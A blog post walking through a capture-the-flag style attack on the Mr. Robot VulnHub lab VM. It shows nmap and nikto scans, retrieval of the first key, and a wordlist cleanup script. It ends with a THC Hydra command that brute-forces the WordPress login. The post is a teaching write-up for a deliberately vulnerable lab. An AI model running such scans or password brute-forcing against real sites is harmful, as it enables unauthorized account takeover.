---
layout: post
author: trent
title: Hacking f_society.
---

# Introduction
Mr. Robot is a show on AMC about a disturbed hacker attempting to thwart an omni-present
oligarchy while at the same time trying to suppress a dark alter-ego modeled after his
own father.

Notably, the show tries to portray "hacking" realistically (inasmuch as it can without entire episodes
dedicated to watching Elliot pore over the documentation of a specific vulnerable version
of httpd running on Windows Server 2000), and I appreciate it. Well, mostly.

With that in mind, let's break a Mr. Robot themed VM together, and maybe learn something
about webapp security along the way.

Download the .ova from [vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/), pop it
in your favorite virtualization software (hard to go wrong with VirtualBox), and boot it up.
The Mr. Robot VM grabs a DHCP lease on boot, and I'd recommend running it and your offense
box on the same virtual subnet.

# Recon / Scanning
First, let's scan the subnet to find Mr. Robot's VM.

```shell
root@bento:~# nmap -A 10.0.2.0/24
Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-03 23:48 PDT

Nmap scan report for 10.0.2.5
Host is up (0.00052s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 08:00:27:6C:39:39 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.19
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 10.0.2.5
```


From the scan, we can see the VM is probably serving some sort of web-service.
Before we investigate this further, however, let's run some more scans and see
if we can dig up anything else.

```shell
root@bento:~# nikto -host 10.0.2.5
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.5
+ Target Hostname:    10.0.2.5
+ Target Port:        80
---------------------------------------------------------------------------
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
```

Our nikto scan turns up a bunch of interesting directories, including what looks like
an admin portal for a WordPress site. Definitely worth checking out.

Navigating to the VMs IP in Firefox yields the following page:

![]({{ site.baseurl }}/assets/img/mr_robot.webm)

None of the commands are all that interesting. What is interesting,
however, is the site's robots.txt file:

![]({{ site.baseurl }}/assets/img/robots.png)

Looks like we've got our first key.

```shell
root@bento~# wget http://10.0.2.10/key-1-of-3.txt
--2016-08-06 18:43:14--  http://10.0.2.10/key-1-of-3.txt
Connecting to 10.0.2.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33 [text/plain]
Saving to: ‘key-1-of-3.txt’

key-1-of-3.txt      100%[===================>]      33  --.-KB/s    in 0s      

2016-08-06 18:43:14 (7.39 MB/s) - ‘key-1-of-3.txt’ saved [33/33]

root@bento~# cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

That's a pretty easy win in my book. I'll take it. Save the .dic file for
later, there's no telling how it will come in handy but I doubt they let
us have it for nothing.

Time to revisit the nikto scan and see if we can turn up anything from the
WordPress directories. Let's start with the login page, /wp-login.php.

# Gaining Access

Poking at the login page with a few default credentials doesn't really reveal
anything interesting. Routing the request/response traffic through Burp also
comes up short. Going back to the .dic file we downloaded earlier, it's pretty
clearly some kind of wordlist. There are many duplicate words in there, however,
so I hacked together a Python script to remove them:

```Python
with open('fsocity.dic') as infile: dic = infile.readlines()
dic = set(dic)
fsocity = open('fsocity_sorted.dic', 'w')
for i in dic: fsocity.write("%s" % i)
```

Now, using the sorted wordlist and the username 'Elliot' (the most commonly occurring
username in the .dic file) we can attempt to crack the WordPress login. I'll be
using THC Hydra to do my web cracking, which means to properly format our Hydra
commands we'll need to get the login request parameters. I'll use Burp Suite for
this task. If you're not familiar with Burp, read up on its basic usage [here](https://portswigger.net/burp/help/)
before trying this. In essence, we proxy our web browser through the localhost on
port 8080 (the default for Burp), then attempt a login. Burp will intercept the
request/response traffic, and allow us to see the login form's internals. What we're
really looking for is the method (usually POST), the form parameters, and the failure
response. With all of this information assembled, we can construct our hydra command:

```shell
root@bento~# hydra 10.0.2.10 http-form-post "/wp-login.php:user_login=^USER^&user_pass=^PASS^:lostpassword" -l Elliot -P fsocity_sorted.dic -t 10
```

From Burp, we have 'user_login' and 'user_pass' as the form params, and 'lostpassword'
as the failure message.

-TC
